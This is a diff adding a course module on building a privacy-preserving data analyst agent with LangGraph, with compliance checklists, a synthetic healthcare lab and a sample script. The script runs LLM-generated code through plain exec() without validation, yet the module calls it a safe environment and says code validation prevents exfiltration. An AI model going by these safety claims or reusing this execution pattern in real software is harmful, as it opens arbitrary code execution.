+- [ ] Purpose limitation: Clear documentation of analysis purposes
+- [ ] Right to access: Users can request their analysis history
+- [ ] Right to erasure: Deletion mechanism implemented
+- [ ] Article 22: Human oversight for automated decisions
+- [ ] Data Protection Impact Assessment (DPIA) completed
+
+#### HIPAA Compliance
+
+- [ ] BAA signed with cloud providers (if using cloud APIs)
+- [ ] Access controls: Authentication required
+- [ ] Audit controls: All PHI access logged
+- [ ] Integrity controls: Data hash verification
+- [ ] Transmission security: TLS or local-only processing
+- [ ] Minimum necessary: Schema-only approach
+
+#### SOC2 Type II
+
+- [ ] Access management documented
+- [ ] Change management process
+- [ ] Incident response plan
+- [ ] Continuous monitoring
+- [ ] Annual penetration testing
+- [ ] Vendor risk assessment (E2B, LLM providers)
+
+---
+
+## 🧪 Lab Exercise: Build a Compliant Analyst
+
+**Objective**: Create a data analyst that can analyze a healthcare dataset while maintaining HIPAA compliance.
+
+### Requirements
+
+1. Never expose PII (names, SSN, addresses)
+2. Use local embeddings for any RAG
+3. Validate all generated code
+4. Log all queries for audit trail
+5. Support both local and API LLMs
+
+### Test Dataset
+
+Create a synthetic healthcare dataset:
+
+```python
+import pandas as pd
+import numpy as np
+
+np.random.seed(42)
+
+df = pd.DataFrame({
+    "patient_id": range(1000),
+    "age": np.random.randint(18, 90, 1000),
+    "gender": np.random.choice(["M", "F"], 1000),
+    "diagnosis_code": np.random.choice(["A01", "B02", "C03", "D04"], 1000),
+    "treatment_cost": np.random.uniform(100, 10000, 1000),
+    "length_of_stay": np.random.randint(1, 30, 1000),
+    "readmitted": np.random.choice([True, False], 1000, p=[0.2, 0.8])
+})
+
+df.to_csv("healthcare_data.csv", index=False)
+```
+
+### Test Queries
+
+1. "What's the average treatment cost by diagnosis?"
+2. "Is there a correlation between age and length of stay?"
+3. "What's the readmission rate by gender?"
+4. "Plot the distribution of treatment costs"
+
+---
+
+### 15.9 Step-by-Step Implementation Guide
+
+Follow this guide to build the privacy-first Local Data Analyst.
+
+## Phase 1: Scaffolding
+
+1.  **Dependencies**:
+
+    ```bash
+    mkdir local-analyst
+    cd local-analyst
+    python -m venv venv
+    source venv/bin/activate
+    pip install langgraph langchain-openai pandas matplotlib tabulate e2b-code-interpreter
+    ```
+
+2.  **Dataset**:
+    Create `sales.csv`:
+    ```csv
+    date,product,amount,region
+    2023-01-01,Widget A,100,North
+    2023-01-02,Widget B,150,South
+    2023-01-03,Widget A,120,North
+    2023-01-04,Widget C,200,East
+    ```
+
+## Phase 2: Core Logic
+
+Create `analyst.py` incorporating the components we built:
+
+````python
+import os
+import pandas as pd
+import json
+import ast
+from typing import TypedDict
+from dotenv import load_dotenv
+from langchain_openai import ChatOpenAI
+from langgraph.graph import StateGraph, END
+
+load_dotenv()
+
+# --- 1. Schema Extraction ---
+def extract_safe_schema(df: pd.DataFrame) -> dict:
+    return {
+        "columns": [
+            {"name": col, "dtype": str(df[col].dtype)}
+            for col in df.columns
+        ],
+        "row_count": len(df)
+    }
+
+# --- 2. Code Generation ---
+CODE_PROMPT = """You are a data analyst. Write Python code to analyze the dataframe `df`.
+Schema: {schema}
+Query: {query}
+Result must be printed or saved to 'output.png'. No external calls."""
+
+def generate_code(state):
+    llm = ChatOpenAI(model="gpt-4o")
+    response = llm.invoke(CODE_PROMPT.format(
+        schema=state["schema"], query=state["query"]
+    ))
+    code = response.content.replace("```python", "").replace("```", "").strip()
+    return {"generated_code": code}
+
+# --- 3. Execution (Mock Sandbox for Local Demo) ---
+# In production, use E2B. For this simple local demo, we use exec() carefully.
+def execute_code(state):
+    df = pd.read_csv("sales.csv")
+    code = state["generated_code"]
+
+    # Safe execute environment
+    local_scope = {"df": df, "pd": pd}
+
+    try:
+        exec(code, {}, local_scope)
+        return {"execution_result": "Executed successfully"}
+    except Exception as e:
+        return {"execution_result": str(e)}
+
+# --- 4. The Graph ---
+class AnalystState(TypedDict):
+    query: str
+    schema: dict
+    generated_code: str
+    execution_result: str
+
+workflow = StateGraph(AnalystState)
+workflow.add_node("extract_schema", lambda s: {"schema": extract_safe_schema(pd.read_csv("sales.csv"))})
+workflow.add_node("generate_code", generate_code)
+workflow.add_node("execute", execute_code)
+
+workflow.set_entry_point("extract_schema")
+workflow.add_edge("extract_schema", "generate_code")
+workflow.add_edge("generate_code", "execute")
+workflow.add_edge("execute", END)
+
+app = workflow.compile()
+
+# Run
+if __name__ == "__main__":
+    result = app.invoke({"query": "Calculate total revenue by region"})
+    print("\n--- Final Code ---\n", result["generated_code"])
+    print("\n--- Execution Result ---\n", result["execution_result"])
+````
+
+## Phase 3: Verification
+
+1.  **Run**: `python analyst.py`
+2.  **Verify Privacy**:
+    - Check the `generate_code` function logs.
+    - Confirm ONLY the schema (column names) is sent to the LLM.
+    - Confirm the implicit `df` values are NEVER sent.
+
+## Why this is "Safe"
+
+The data (`sales.csv`) never leaves your machine. Only the _schema_ (column names) and the _code_ to run are sent to OpenAI. The actual processing happens in your local Python process (or Sandbox).
+
+---
+
+## 📚 Key Takeaways
+
+1. **Schema-only** approach keeps data private
+2. **Code validation** prevents data exfiltration
+3. **Sandboxing** isolates execution
+4. **Local LLMs** provide maximum privacy
+5. **LanceDB** enables local-first RAG
+
+---
+
+<ModuleSummary
+  points={[
+    "The 'Blind Programmer' pattern lets LLMs analyze data they never see",
+    "Schema extraction provides structure without exposing actual values",
+    "E2B sandboxes execute generated code in isolated environments",
+    "Local LLMs (Ollama) keep all processing on-premises",
+    "LanceDB provides embedded vector search without external API calls",
+    "Column name anonymization adds an extra layer of privacy protection",
+  ]}
+/>
+
+---
+
+## 🔗 Further Reading
+
+### Core Documentation
+
+- [E2B Documentation](https://e2b.dev/docs) - Secure sandbox execution
+- [LanceDB Documentation](https://lancedb.github.io/lancedb/) - Local-first vector database
+- [Modal Documentation](https://modal.com/docs) - Serverless Python execution
+
+### Privacy & Compliance
+
+- [HIPAA Technical Safeguards](https://www.hhs.gov/hipaa/for-professionals/security/guidance/) - HHS guidance
+- [GDPR and AI](https://gdpr.eu/ai/) - EU AI Act implications
+- [NIST AI Risk Management Framework](https://www.nist.gov/itl/ai-risk-management-framework) - 2024 updates
+- [Azure OpenAI Data Privacy](https://learn.microsoft.com/en-us/legal/cognitive-services/openai/data-privacy) - Microsoft's commitments
+- [Anthropic Data Handling](https://www.anthropic.com/policies) - Claude API policies
+
+### Security Resources
+
+- [OWASP LLM Top 10](https://owasp.org/www-project-top-10-for-large-language-model-applications/) - 2024 edition
+- [Bandit Security Scanner](https://bandit.readthedocs.io/) - Python security linting
+
+**Tomorrow**: We continue with Project 4—The Automated Refactorer (Legacy Code Agent).
+
+---
+
+## Hands-On Practice
+
+<Callout type="tip">
+  **Builds Toward Capstone:** This project directly contributes to the **Data
+  Analyst Agent** in your final AgentOS capstone. The privacy-preserving
+  patterns (schema-only analysis, local LLMs, LanceDB) become the foundation for
+  handling sensitive user documents in the capstone's RAG system.
+</Callout>
+
+### Prerequisite Exercises
+
+Before starting this project, complete:
+
+- **EX-01**: First LLM Call (15 min) - Basic LLM interaction patterns
+- **EX-03**: Tool Definition (20 min) - Creating tools for the analyst
+- **EX-06**: ReAct Loop (30 min) - Agent reasoning patterns
+
+### Related POCs
+
+- **POC-01**: LangGraph State Machine (1-2 hours) - The workflow foundation
+- **POC-03**: Local LLM Setup (1-2 hours) - Ollama configuration for privacy
+
+### Mini Project Connection
+
+This project feeds into:
+
+- **MP-03**: RAG Service (2-4 hours) - Uses LanceDB patterns from this project
+
+See the [Project Hierarchy](/modules/day-00-project-hierarchy) for the complete learning path.
